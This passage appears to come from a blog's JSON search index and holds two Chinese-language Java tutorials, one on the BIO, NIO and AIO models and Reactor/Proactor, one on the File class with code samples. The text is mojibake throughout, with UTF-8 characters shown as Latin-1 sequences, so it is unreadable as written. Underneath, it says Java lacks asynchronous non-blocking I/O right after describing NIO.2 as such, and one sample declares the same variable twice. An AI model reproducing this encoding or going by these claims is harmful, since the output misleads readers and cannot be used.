åœ¨ä½¿ç”¨åŒæ­¥I/Oçš„ç½‘ç»œåº”ç”¨ä¸­ï¼Œå¦‚æœè¦åŒæ—¶å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚ï¼Œæˆ–æ˜¯åœ¨å®¢æˆ·ç«¯è¦åŒæ—¶å’Œå¤šä¸ªæœåŠ¡å™¨è¿›è¡Œé€šè®¯ï¼Œå°±å¿…é¡»ä½¿ç”¨å¤šçº¿ç¨‹æ¥å¤„ç†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†æ¯ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚åˆ†é…ç»™ä¸€ä¸ªçº¿ç¨‹æ¥å•ç‹¬å¤„ç†ã€‚è¿™æ ·åšè™½ç„¶å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„è¦æ±‚ï¼Œä½†åŒæ—¶åˆä¼šå¸¦æ¥å¦å¤–ä¸€ä¸ªé—®é¢˜ã€‚ç”±äºæ¯åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œå°±è¦ä¸ºè¿™ä¸ªçº¿ç¨‹åˆ†é…ä¸€å®šçš„å†…å­˜ç©ºé—´ï¼ˆä¹Ÿå«å·¥ä½œå­˜å‚¨å™¨ï¼‰ï¼Œè€Œä¸”æ“ä½œç³»ç»Ÿæœ¬èº«ä¹Ÿå¯¹çº¿ç¨‹çš„æ€»æ•°æœ‰ä¸€å®šçš„é™åˆ¶ã€‚å¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚è¿‡å¤šï¼ŒæœåŠ¡ç«¯ç¨‹åºå¯èƒ½ä¼šå› ä¸ºä¸å ªé‡è´Ÿè€Œæ‹’ç»å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç”šè‡³æœåŠ¡å™¨å¯èƒ½ä¼šå› æ­¤è€Œç˜«ç—ªã€‚ NIOåŸºäºReactorï¼Œå½“socketæœ‰æµå¯è¯»æˆ–å¯å†™å…¥socketæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šç›¸åº”çš„é€šçŸ¥å¼•ç”¨ç¨‹åºè¿›è¡Œå¤„ç†ï¼Œåº”ç”¨å†å°†æµè¯»å–åˆ°ç¼“å†²åŒºæˆ–å†™å…¥æ“ä½œç³»ç»Ÿã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå·²ç»ä¸æ˜¯ä¸€ä¸ªè¿æ¥å°±è¦å¯¹åº”ä¸€ä¸ªå¤„ç†çº¿ç¨‹äº†ï¼Œè€Œæ˜¯æœ‰æ•ˆçš„è¯·æ±‚ï¼Œå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œå½“è¿æ¥æ²¡æœ‰æ•°æ®æ—¶ï¼Œæ˜¯æ²¡æœ‰å·¥ä½œçº¿ç¨‹æ¥å¤„ç†çš„ã€‚ BIOä¸NIOä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ä¸åŒï¼Œæ˜¯æˆ‘ä»¬ä½¿ç”¨BIOçš„æ—¶å€™å¾€å¾€ä¼šå¼•å…¥å¤šçº¿ç¨‹ï¼Œæ¯ä¸ªè¿æ¥ä¸€ä¸ªå•ç‹¬çš„çº¿ç¨‹ï¼›è€ŒNIOåˆ™æ˜¯ä½¿ç”¨å•çº¿ç¨‹æˆ–è€…åªä½¿ç”¨å°‘é‡çš„å¤šçº¿ç¨‹ï¼Œæ¯ä¸ªè¿æ¥å…±ç”¨ä¸€ä¸ªçº¿ç¨‹ã€‚ img NIOçš„æœ€é‡è¦çš„åœ°æ–¹æ˜¯å½“ä¸€ä¸ªè¿æ¥åˆ›å»ºåï¼Œä¸éœ€è¦å¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™ä¸ªè¿æ¥ä¼šè¢«æ³¨å†Œåˆ°å¤šè·¯å¤ç”¨å™¨ä¸Šé¢ï¼Œæ‰€ä»¥æ‰€æœ‰çš„è¿æ¥åªéœ€è¦ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥æå®šï¼Œå½“è¿™ä¸ªçº¿ç¨‹ä¸­çš„å¤šè·¯å¤ç”¨å™¨è¿›è¡Œè½®è¯¢çš„æ—¶å€™ï¼Œå‘ç°è¿æ¥ä¸Šæœ‰è¯·æ±‚çš„è¯ï¼Œæ‰å¼€å¯ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹æ¨¡å¼ã€‚ åœ¨NIOçš„å¤„ç†æ–¹å¼ä¸­ï¼Œå½“ä¸€ä¸ªè¯·æ±‚æ¥çš„è¯ï¼Œå¼€å¯çº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œå¯èƒ½ä¼šç­‰å¾…åç«¯åº”ç”¨çš„èµ„æº(JDBCè¿æ¥ç­‰)ï¼Œå…¶å®è¿™ä¸ªçº¿ç¨‹å°±è¢«é˜»å¡äº†ï¼Œå½“å¹¶å‘ä¸Šæ¥çš„è¯ï¼Œè¿˜æ˜¯ä¼šæœ‰BIOä¸€æ ·çš„é—®é¢˜ã€‚ HTTP/1.1å‡ºç°åï¼Œæœ‰äº†Httpé•¿è¿æ¥ï¼Œè¿™æ ·é™¤äº†è¶…æ—¶å’ŒæŒ‡æ˜ç‰¹å®šå…³é—­çš„http headerå¤–ï¼Œè¿™ä¸ªé“¾æ¥æ˜¯ä¸€ç›´æ‰“å¼€çš„çŠ¶æ€çš„ï¼Œè¿™æ ·åœ¨NIOå¤„ç†ä¸­å¯ä»¥è¿›ä¸€æ­¥çš„è¿›åŒ–ï¼Œåœ¨åç«¯èµ„æºä¸­å¯ä»¥å®ç°èµ„æºæ± æˆ–è€…é˜Ÿåˆ—ï¼Œå½“è¯·æ±‚æ¥çš„è¯ï¼Œå¼€å¯çš„çº¿ç¨‹æŠŠè¯·æ±‚å’Œè¯·æ±‚æ•°æ®ä¼ é€ç»™åç«¯èµ„æºæ± æˆ–è€…é˜Ÿåˆ—é‡Œé¢å°±è¿”å›ï¼Œå¹¶ä¸”åœ¨å…¨å±€çš„åœ°æ–¹ä¿æŒä½è¿™ä¸ªç°åœº(å“ªä¸ªè¿æ¥çš„å“ªä¸ªè¯·æ±‚ç­‰)ï¼Œè¿™æ ·å‰é¢çš„çº¿ç¨‹è¿˜æ˜¯å¯ä»¥å»æ¥å—å…¶ä»–çš„è¯·æ±‚ï¼Œè€Œåç«¯çš„åº”ç”¨çš„å¤„ç†åªéœ€è¦æ‰§è¡Œé˜Ÿåˆ—é‡Œé¢çš„å°±å¯ä»¥äº†ï¼Œè¿™æ ·è¯·æ±‚å¤„ç†å’Œåç«¯åº”ç”¨æ˜¯å¼‚æ­¥çš„.å½“åç«¯å¤„ç†å®Œï¼Œåˆ°å…¨å±€åœ°æ–¹å¾—åˆ°ç°åœºï¼Œäº§ç”Ÿå“åº”ï¼Œè¿™ä¸ªå°±å®ç°äº†å¼‚æ­¥å¤„ç†ã€‚ ä¸‰ã€AIO ä¸NIOä¸åŒï¼Œå½“è¿›è¡Œè¯»å†™æ“ä½œæ—¶ï¼Œåªé¡»ç›´æ¥è°ƒç”¨APIçš„readæˆ–writeæ–¹æ³•å³å¯ã€‚è¿™ä¸¤ç§æ–¹æ³•å‡ä¸ºå¼‚æ­¥çš„ï¼Œå¯¹äºè¯»æ“ä½œè€Œè¨€ï¼Œå½“æœ‰æµå¯è¯»å–æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†å¯è¯»çš„æµä¼ å…¥readæ–¹æ³•çš„ç¼“å†²åŒºï¼Œå¹¶é€šçŸ¥åº”ç”¨ç¨‹åºï¼›å¯¹äºå†™æ“ä½œè€Œè¨€ï¼Œå½“æ“ä½œç³»ç»Ÿå°†writeæ–¹æ³•ä¼ é€’çš„æµå†™å…¥å®Œæ¯•æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¸»åŠ¨é€šçŸ¥åº”ç”¨ç¨‹åºã€‚ å³å¯ä»¥ç†è§£ä¸ºï¼Œread/writeæ–¹æ³•éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œå®Œæˆåä¼šä¸»åŠ¨è°ƒç”¨å›è°ƒå‡½æ•°ã€‚ åœ¨JDK1.7ä¸­ï¼Œè¿™éƒ¨åˆ†å†…å®¹è¢«ç§°ä½œNIO.2ï¼Œä¸»è¦åœ¨java.nio.channelsåŒ…ä¸‹å¢åŠ äº†ä¸‹é¢å››ä¸ªå¼‚æ­¥é€šé“ï¼š AsynchronousSocketChannel AsynchronousServerSocketChannel AsynchronousFileChannel AsynchronousDatagramChannel å…¶ä¸­çš„read/writeæ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªå¸¦å›è°ƒå‡½æ•°çš„å¯¹è±¡ï¼Œå½“æ‰§è¡Œå®Œè¯»å–/å†™å…¥æ“ä½œåï¼Œç›´æ¥è°ƒç”¨å›è°ƒå‡½æ•°ã€‚ BIOæ˜¯ä¸€ä¸ªè¿æ¥ä¸€ä¸ªçº¿ç¨‹ã€‚ NIOæ˜¯ä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹ã€‚ AIOæ˜¯ä¸€ä¸ªæœ‰æ•ˆè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹ã€‚ å…ˆæ¥ä¸ªä¾‹å­ç†è§£ä¸€ä¸‹æ¦‚å¿µï¼Œä»¥é“¶è¡Œå–æ¬¾ä¸ºä¾‹ï¼š åŒæ­¥ ï¼š è‡ªå·±äº²è‡ªå‡ºé©¬æŒé“¶è¡Œå¡åˆ°é“¶è¡Œå–é’±ï¼ˆä½¿ç”¨åŒæ­¥IOæ—¶ï¼ŒJavaè‡ªå·±å¤„ç†IOè¯»å†™ï¼‰ï¼› å¼‚æ­¥ ï¼š å§”æ‰˜ä¸€å°å¼Ÿæ‹¿é“¶è¡Œå¡åˆ°é“¶è¡Œå–é’±ï¼Œç„¶åç»™ä½ ï¼ˆä½¿ç”¨å¼‚æ­¥IOæ—¶ï¼ŒJavaå°†IOè¯»å†™å§”æ‰˜ç»™OSå¤„ç†ï¼Œéœ€è¦å°†æ•°æ®ç¼“å†²åŒºåœ°å€å’Œå¤§å°ä¼ ç»™OS(é“¶è¡Œå¡å’Œå¯†ç )ï¼ŒOSéœ€è¦æ”¯æŒå¼‚æ­¥IOæ“ä½œAPIï¼‰ï¼› é˜»å¡ ï¼š ATMæ’é˜Ÿå–æ¬¾ï¼Œä½ åªèƒ½ç­‰å¾…ï¼ˆä½¿ç”¨é˜»å¡IOæ—¶ï¼ŒJavaè°ƒç”¨ä¼šä¸€ç›´é˜»å¡åˆ°è¯»å†™å®Œæˆæ‰è¿”å›ï¼‰ï¼› éé˜»å¡ ï¼š æŸœå°å–æ¬¾ï¼Œå–ä¸ªå·ï¼Œç„¶åååœ¨æ¤…å­ä¸Šåšå…¶å®ƒäº‹ï¼Œç­‰å·å¹¿æ’­ä¼šé€šçŸ¥ä½ åŠç†ï¼Œæ²¡åˆ°å·ä½ å°±ä¸èƒ½å»ï¼Œä½ å¯ä»¥ä¸æ–­é—®å¤§å ‚ç»ç†æ’åˆ°äº†æ²¡æœ‰ï¼Œå¤§å ‚ç»ç†å¦‚æœè¯´è¿˜æ²¡åˆ°ä½ å°±ä¸èƒ½å»ï¼ˆä½¿ç”¨éé˜»å¡IOæ—¶ï¼Œå¦‚æœä¸èƒ½è¯»å†™Javaè°ƒç”¨ä¼šé©¬ä¸Šè¿”å›ï¼Œå½“IOäº‹ä»¶åˆ†å‘å™¨ä¼šé€šçŸ¥å¯è¯»å†™æ—¶å†ç»§ç»­è¿›è¡Œè¯»å†™ï¼Œä¸æ–­å¾ªç¯ç›´åˆ°è¯»å†™å®Œæˆï¼‰ Javaå¯¹BIOã€NIOã€AIOçš„æ”¯æŒï¼š Java BIO ï¼š åŒæ­¥å¹¶é˜»å¡ï¼ŒæœåŠ¡å™¨å®ç°æ¨¡å¼ä¸ºä¸€ä¸ªè¿æ¥ä¸€ä¸ªçº¿ç¨‹ï¼Œå³å®¢æˆ·ç«¯æœ‰è¿æ¥è¯·æ±‚æ—¶æœåŠ¡å™¨ç«¯å°±éœ€è¦å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œå¦‚æœè¿™ä¸ªè¿æ¥ä¸åšä»»ä½•äº‹æƒ…ä¼šé€ æˆä¸å¿…è¦çš„çº¿ç¨‹å¼€é”€ï¼Œå½“ç„¶å¯ä»¥é€šè¿‡çº¿ç¨‹æ± æœºåˆ¶æ”¹å–„ã€‚ Java NIO ï¼š åŒæ­¥éé˜»å¡ï¼ŒæœåŠ¡å™¨å®ç°æ¨¡å¼ä¸ºä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹ï¼Œå³å®¢æˆ·ç«¯å‘é€çš„è¿æ¥è¯·æ±‚éƒ½ä¼šæ³¨å†Œåˆ°å¤šè·¯å¤ç”¨å™¨ä¸Šï¼Œå¤šè·¯å¤ç”¨å™¨è½®è¯¢åˆ°è¿æ¥æœ‰I/Oè¯·æ±‚æ—¶æ‰å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†ã€‚ Java AIO(NIO.2) ï¼š å¼‚æ­¥éé˜»å¡ï¼ŒæœåŠ¡å™¨å®ç°æ¨¡å¼ä¸ºä¸€ä¸ªæœ‰æ•ˆè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹ï¼Œå®¢æˆ·ç«¯çš„I/Oè¯·æ±‚éƒ½æ˜¯ç”±OSå…ˆå®Œæˆäº†å†é€šçŸ¥æœåŠ¡å™¨åº”ç”¨å»å¯åŠ¨çº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œ BIOã€NIOã€AIOé€‚ç”¨åœºæ™¯åˆ†æ: BIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®æ¯”è¾ƒå°ä¸”å›ºå®šçš„æ¶æ„ï¼Œè¿™ç§æ–¹å¼å¯¹æœåŠ¡å™¨èµ„æºè¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼ŒJDK1.4ä»¥å‰çš„å”¯ä¸€é€‰æ‹©ï¼Œä½†ç¨‹åºç›´è§‚ç®€å•æ˜“ç†è§£ã€‚ NIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒçŸ­ï¼ˆè½»æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚èŠå¤©æœåŠ¡å™¨ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ï¼ŒJDK1.4å¼€å§‹æ”¯æŒã€‚ AIOæ–¹å¼ä½¿ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒé•¿ï¼ˆé‡æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚ç›¸å†ŒæœåŠ¡å™¨ï¼Œå……åˆ†è°ƒç”¨OSå‚ä¸å¹¶å‘æ“ä½œï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ï¼ŒJDK7å¼€å§‹æ”¯æŒã€‚ å¦å¤–ï¼ŒI/Oå±äºåº•å±‚æ“ä½œï¼Œéœ€è¦æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œå¹¶å‘ä¹Ÿéœ€è¦æ“ä½œç³»ç»Ÿçš„æ”¯æŒï¼Œæ‰€ä»¥æ€§èƒ½æ–¹é¢ä¸åŒæ“ä½œç³»ç»Ÿå·®å¼‚ä¼šæ¯”è¾ƒæ˜æ˜¾ã€‚ åœ¨é«˜æ€§èƒ½çš„I/Oè®¾è®¡ä¸­ï¼Œæœ‰ä¸¤ä¸ªæ¯”è¾ƒè‘—åçš„æ¨¡å¼Reactorå’ŒProactoræ¨¡å¼ï¼Œå…¶ä¸­Reactoræ¨¡å¼ç”¨äºåŒæ­¥I/Oï¼Œè€ŒProactorè¿ç”¨äºå¼‚æ­¥I/Oæ“ä½œã€‚ åœ¨æ¯”è¾ƒè¿™ä¸¤ä¸ªæ¨¡å¼ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆçš„ææ˜ç™½å‡ ä¸ªæ¦‚å¿µï¼Œä»€ä¹ˆæ˜¯é˜»å¡å’Œéé˜»å¡ï¼Œä»€ä¹ˆæ˜¯åŒæ­¥å’Œå¼‚æ­¥,åŒæ­¥å’Œå¼‚æ­¥æ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºå’Œå†…æ ¸çš„äº¤äº’è€Œè¨€çš„ï¼ŒåŒæ­¥æŒ‡çš„æ˜¯ç”¨æˆ·è¿›ç¨‹è§¦å‘IOæ“ä½œå¹¶ç­‰å¾…æˆ–è€…è½®è¯¢çš„å»æŸ¥çœ‹IOæ“ä½œæ˜¯å¦å°±ç»ªï¼Œè€Œå¼‚æ­¥æ˜¯æŒ‡ç”¨æˆ·è¿›ç¨‹è§¦å‘IOæ“ä½œä»¥åä¾¿å¼€å§‹åšè‡ªå·±çš„äº‹æƒ…ï¼Œè€Œå½“IOæ“ä½œå·²ç»å®Œæˆçš„æ—¶å€™ä¼šå¾—åˆ°IOå®Œæˆçš„é€šçŸ¥ã€‚è€Œé˜»å¡å’Œéé˜»å¡æ˜¯é’ˆå¯¹äºè¿›ç¨‹åœ¨è®¿é—®æ•°æ®çš„æ—¶å€™ï¼Œæ ¹æ®IOæ“ä½œçš„å°±ç»ªçŠ¶æ€æ¥é‡‡å–çš„ä¸åŒæ–¹å¼ï¼Œè¯´ç™½äº†æ˜¯ä¸€ç§è¯»å–æˆ–è€…å†™å…¥æ“ä½œå‡½æ•°çš„å®ç°æ–¹å¼ï¼Œé˜»å¡æ–¹å¼ä¸‹è¯»å–æˆ–è€…å†™å…¥å‡½æ•°å°†ä¸€ç›´ç­‰å¾…ï¼Œè€Œéé˜»å¡æ–¹å¼ä¸‹ï¼Œè¯»å–æˆ–è€…å†™å…¥å‡½æ•°ä¼šç«‹å³è¿”å›ä¸€ä¸ªçŠ¶æ€å€¼ã€‚ ä¸€èˆ¬æ¥è¯´I/Oæ¨¡å‹å¯ä»¥åˆ†ä¸ºï¼šåŒæ­¥é˜»å¡ï¼ŒåŒæ­¥éé˜»å¡ï¼Œå¼‚æ­¥é˜»å¡ï¼Œå¼‚æ­¥éé˜»å¡IO åŒæ­¥é˜»å¡IOï¼šåœ¨æ­¤ç§æ–¹å¼ä¸‹ï¼Œç”¨æˆ·è¿›ç¨‹åœ¨å‘èµ·ä¸€ä¸ªIOæ“ä½œä»¥åï¼Œå¿…é¡»ç­‰å¾…IOæ“ä½œçš„å®Œæˆï¼Œåªæœ‰å½“çœŸæ­£å®Œæˆäº†IOæ“ä½œä»¥åï¼Œç”¨æˆ·è¿›ç¨‹æ‰èƒ½è¿è¡Œã€‚JAVAä¼ ç»Ÿçš„IOæ¨¡å‹å±äºæ­¤ç§æ–¹å¼ï¼ åŒæ­¥éé˜»å¡IO:åœ¨æ­¤ç§æ–¹å¼ä¸‹ï¼Œç”¨æˆ·è¿›ç¨‹å‘èµ·ä¸€ä¸ªIOæ“ä½œä»¥åè¾¹å¯è¿”å›åšå…¶å®ƒäº‹æƒ…ï¼Œä½†æ˜¯ç”¨æˆ·è¿›ç¨‹éœ€è¦æ—¶ä¸æ—¶çš„è¯¢é—®IOæ“ä½œæ˜¯å¦å°±ç»ªï¼Œè¿™å°±è¦æ±‚ç”¨æˆ·è¿›ç¨‹ä¸åœçš„å»è¯¢é—®ï¼Œä»è€Œå¼•å…¥ä¸å¿…è¦çš„CPUèµ„æºæµªè´¹ã€‚å…¶ä¸­ç›®å‰JAVAçš„NIOå°±å±äºåŒæ­¥éé˜»å¡IOã€‚ å¼‚æ­¥é˜»å¡IOï¼šæ­¤ç§æ–¹å¼ä¸‹æ˜¯æŒ‡åº”ç”¨å‘èµ·ä¸€ä¸ªIOæ“ä½œä»¥åï¼Œä¸ç­‰å¾…å†…æ ¸IOæ“ä½œçš„å®Œæˆï¼Œç­‰å†…æ ¸å®ŒæˆIOæ“ä½œä»¥åä¼šé€šçŸ¥åº”ç”¨ç¨‹åºï¼Œè¿™å…¶å®å°±æ˜¯åŒæ­¥å’Œå¼‚æ­¥æœ€å…³é”®çš„åŒºåˆ«ï¼ŒåŒæ­¥å¿…é¡»ç­‰å¾…æˆ–è€…ä¸»åŠ¨çš„å»è¯¢é—®IOæ˜¯å¦å®Œæˆï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¯´æ˜¯é˜»å¡çš„å‘¢ï¼Ÿå› ä¸ºæ­¤æ—¶æ˜¯é€šè¿‡selectç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆçš„ï¼Œè€Œselectå‡½æ•°æœ¬èº«çš„å®ç°æ–¹å¼æ˜¯é˜»å¡çš„ï¼Œè€Œé‡‡ç”¨selectå‡½æ•°æœ‰ä¸ªå¥½å¤„å°±æ˜¯å®ƒå¯ä»¥åŒæ—¶ç›‘å¬å¤šä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„å¹¶å‘æ€§ï¼ å¼‚æ­¥éé˜»å¡IO:åœ¨æ­¤ç§æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·è¿›ç¨‹åªéœ€è¦å‘èµ·ä¸€ä¸ªIOæ“ä½œç„¶åç«‹å³è¿”å›ï¼Œç­‰IOæ“ä½œçœŸæ­£çš„å®Œæˆä»¥åï¼Œåº”ç”¨ç¨‹åºä¼šå¾—åˆ°IOæ“ä½œå®Œæˆçš„é€šçŸ¥ï¼Œæ­¤æ—¶ç”¨æˆ·è¿›ç¨‹åªéœ€è¦å¯¹æ•°æ®è¿›è¡Œå¤„ç†å°±å¥½äº†ï¼Œä¸éœ€è¦è¿›è¡Œå®é™…çš„IOè¯»å†™æ“ä½œï¼Œå› ä¸ºçœŸæ­£çš„IOè¯»å–æˆ–è€…å†™å…¥æ“ä½œå·²ç»ç”±å†…æ ¸å®Œæˆäº†ã€‚ç›®å‰Javaä¸­è¿˜æ²¡æœ‰æ”¯æŒæ­¤ç§IOæ¨¡å‹ã€‚","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"Talk about:IO","slug":"æµ…è°ˆIO","date":"2020-12-20T06:45:19.000Z","updated":"2021-04-11T17:11:28.964Z","comments":true,"path":"æµ…è°ˆIO/","link":"","permalink":"https://blog.kayleh.top/%E6%B5%85%E8%B0%88IO/","excerpt":"","text":"Fileå¯¹è±¡åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶æ˜¯éå¸¸é‡è¦çš„å­˜å‚¨æ–¹å¼ã€‚Javaçš„æ ‡å‡†åº“java.ioæä¾›äº†Fileå¯¹è±¡æ¥æ“ä½œæ–‡ä»¶å’Œç›®å½•ã€‚ è¦æ„é€ ä¸€ä¸ªFileå¯¹è±¡ï¼Œéœ€è¦ä¼ å…¥æ–‡ä»¶è·¯å¾„ï¼š public class Main { public static void main(String[] args) { File f = new File(&quot;C:\\\\Windows\\\\notepad.exe&quot;); System.out.println(f); } } æ„é€ Fileå¯¹è±¡æ—¶ï¼Œæ—¢å¯ä»¥ä¼ å…¥ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥ç›¸å¯¹è·¯å¾„ã€‚ç»å¯¹è·¯å¾„æ˜¯ä»¥æ ¹ç›®å½•å¼€å¤´çš„å®Œæ•´è·¯å¾„ï¼Œä¾‹å¦‚ï¼š File f = new File(&quot;C:\\\\Windows\\\\notepad.exe&quot;); æ³¨æ„Windowså¹³å°ä½¿ç”¨\\ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ï¼Œåœ¨Javaå­—ç¬¦ä¸²ä¸­éœ€è¦ç”¨\\\\è¡¨ç¤ºä¸€ä¸ª\\ã€‚Linuxå¹³å°ä½¿ç”¨/ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ï¼š File f = new File(&quot;/usr/bin/javac&quot;); ä¼ å…¥ç›¸å¯¹è·¯å¾„æ—¶ï¼Œç›¸å¯¹è·¯å¾„å‰é¢åŠ ä¸Šå½“å‰ç›®å½•å°±æ˜¯ç»å¯¹è·¯å¾„ï¼š // å‡è®¾å½“å‰ç›®å½•æ˜¯C:\\Docs File f1 = new File(&quot;sub\\\\javac&quot;); // ç»å¯¹è·¯å¾„æ˜¯C:\\Docs\\sub\\javac File f3 = new File(&quot;.\\\\sub\\\\javac&quot;); // ç»å¯¹è·¯å¾„æ˜¯C:\\Docs\\sub\\javac File f3 = new File(&quot;..\\\\sub\\\\javac&quot;); // ç»å¯¹è·¯å¾„æ˜¯C:\\sub\\javac å¯ä»¥ç”¨.è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ..è¡¨ç¤ºä¸Šçº§ç›®å½•ã€‚ Fileå¯¹è±¡æœ‰3ç§å½¢å¼è¡¨ç¤ºçš„è·¯å¾„ï¼Œä¸€ç§æ˜¯getPath()ï¼Œè¿”å›æ„é€ æ–¹æ³•ä¼ å…¥çš„è·¯å¾„ï¼Œä¸€ç§æ˜¯getAbsolutePath()ï¼Œè¿”å›ç»å¯¹è·¯å¾„ï¼Œä¸€ç§æ˜¯getCanonicalPathï¼Œå®ƒå’Œç»å¯¹è·¯å¾„ç±»ä¼¼ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯è§„èŒƒè·¯å¾„ã€‚ ä»€ä¹ˆæ˜¯è§„èŒƒè·¯å¾„ï¼Ÿæˆ‘ä»¬çœ‹ä»¥ä¸‹ä»£ç ï¼š public class Main { public static void main(String[] args) throws IOException { File f = new File(&quot;..&quot;); System.out.println(f.getPath()); System.out.println(f.getAbsolutePath()); System.out.println(f.getCanonicalPath()); } } ç»å¯¹è·¯å¾„å¯ä»¥è¡¨ç¤ºæˆC:\\Windows\\System32\\..\\notepad.exeï¼Œè€Œè§„èŒƒè·¯å¾„å°±æ˜¯æŠŠ.å’Œ..è½¬æ¢æˆæ ‡å‡†çš„ç»å¯¹è·¯å¾„åçš„è·¯å¾„ï¼šC:\\Windows\\notepad.exeã€‚ å› ä¸ºWindowså’ŒLinuxçš„è·¯å¾„åˆ†éš”ç¬¦ä¸åŒï¼ŒFileå¯¹è±¡æœ‰ä¸€ä¸ªé™æ€å˜é‡ç”¨äºè¡¨ç¤ºå½“å‰å¹³å°çš„ç³»ç»Ÿåˆ†éš”ç¬¦ï¼š System.out.println(File.separator); // æ ¹æ®å½“å‰å¹³å°æ‰“å°&quot;\\&quot;æˆ–&quot;/&quot; æ–‡ä»¶å’Œç›®å½•Fileå¯¹è±¡æ—¢å¯ä»¥è¡¨ç¤ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºç›®å½•ã€‚ç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯ï¼Œæ„é€ ä¸€ä¸ªFileå¯¹è±¡ï¼Œå³ä½¿ä¼ å…¥çš„æ–‡ä»¶æˆ–ç›®å½•ä¸å­˜åœ¨ï¼Œä»£ç ä¹Ÿä¸ä¼šå‡ºé”™ï¼Œå› ä¸ºæ„é€ ä¸€ä¸ªFileå¯¹è±¡ï¼Œå¹¶ä¸ä¼šå¯¼è‡´ä»»ä½•ç£ç›˜æ“ä½œã€‚åªæœ‰å½“æˆ‘ä»¬è°ƒç”¨Fileå¯¹è±¡çš„æŸäº›æ–¹æ³•çš„æ—¶å€™ï¼Œæ‰çœŸæ­£è¿›è¡Œç£ç›˜æ“ä½œã€‚ ä¾‹å¦‚ï¼Œè°ƒç”¨isFile()ï¼Œåˆ¤æ–­è¯¥Fileå¯¹è±¡æ˜¯å¦æ˜¯ä¸€ä¸ªå·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œè°ƒç”¨isDirectory()ï¼Œåˆ¤æ–­è¯¥Fileå¯¹è±¡æ˜¯å¦æ˜¯ä¸€ä¸ªå·²å­˜åœ¨çš„ç›®å½•ï¼š public class Main { public static void main(String[] args) throws IOException { File f1 = new File(&quot;C:\\\\Windows&quot;); File f2 = new File(&quot;C:\\\\Windows\\\\notepad.exe&quot;); File f3 = new File(&quot;C:\\\\Windows\\\\nothing&quot;); System.out.println(f1.isFile()); System.out.println(f1.isDirectory()); System.out.println(f2.isFile()); System.out.println(f2.isDirectory()); System.out.println(f3.isFile()); System.out.println(f3.isDirectory()); } } ç”¨Fileå¯¹è±¡è·å–åˆ°ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥åˆ¤æ–­æ–‡ä»¶çš„æƒé™å’Œå¤§å°ï¼š boolean canRead()ï¼šæ˜¯å¦å¯è¯»ï¼› boolean canWrite()ï¼šæ˜¯å¦å¯å†™ï¼› boolean canExecute()ï¼šæ˜¯å¦å¯æ‰§è¡Œï¼› long length()ï¼šæ–‡ä»¶å­—èŠ‚å¤§å°ã€‚ å¯¹ç›®å½•è€Œè¨€ï¼Œæ˜¯å¦å¯æ‰§è¡Œè¡¨ç¤ºèƒ½å¦åˆ—å‡ºå®ƒåŒ…å«çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚ åˆ›å»ºå’Œåˆ 